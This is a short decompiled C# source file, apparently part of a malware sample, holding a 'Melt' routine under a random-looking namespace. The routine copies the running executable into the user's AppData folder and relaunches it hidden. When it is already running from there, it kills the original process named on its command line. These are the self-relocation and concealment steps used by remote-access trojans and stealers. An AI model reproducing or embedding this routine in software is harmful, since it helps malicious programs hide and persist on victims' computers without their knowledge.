using System;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ajhfsdlhjasnagfgewfwsg;

[StandardModule]
internal sealed class Melt
{
	public static void Melt(string F)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (Operators.CompareString(Application.get_StartupPath(), folderPath, false) != 0)
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), folderPath + "\\" + F);
			Interaction.Shell(folderPath + "\\" + F + " " + Application.get_ExecutablePath(), (AppWinStyle)2, false, -1);
			ProjectData.EndApp();
		}
		else
		{
			Process[] processesByName = Process.GetProcessesByName(Interaction.Command());
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
	}
}
